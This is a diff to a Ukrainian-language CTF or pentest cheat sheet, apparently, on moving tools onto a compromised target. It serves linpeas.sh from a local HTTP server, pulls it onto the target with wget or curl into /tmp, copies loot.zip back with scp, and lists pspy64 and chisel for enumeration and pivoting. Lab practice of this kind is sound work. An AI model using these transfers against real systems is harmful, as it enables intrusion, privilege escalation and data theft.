@@ -11,8 +11,8 @@
 
 ### HTTP (найнадійніше)
 ```bash
-# на локальній машині (у каталозі з linpeas.sh тощо):
-python3 -m http.server 8000
+# на локальній машині (тули вже в репо):
+cd tools/linux && python3 -m http.server 8000
 # на ЦІЛІ (VPN-адреса локальної машини):
 wget http://10.8.N.x:8000/linpeas.sh -O /tmp/lp.sh      # або:
 curl http://10.8.N.x:8000/linpeas.sh -o /tmp/lp.sh
@@ -51,4 +51,4 @@ scp user@$TARGET:/home/user/loot.zip .
 - Великі передачі рвуться → MTU 1280 ([vpn](../00-setup/vpn-wireguard.md)).
 
 ## Що саме заливати (мінімум)
-`linpeas.sh` (enum), `pspy64` (процеси/крон без рута), `chisel` (пивотинг) — підготувати офлайн, [pre-game-checklist](../00-setup/pre-game-checklist.md).
+`linpeas.sh` (enum), `pspy64` (процеси/крон без рута), `chisel` (пивотинг) — усе вже в репо: [tools/](../tools/README.md).
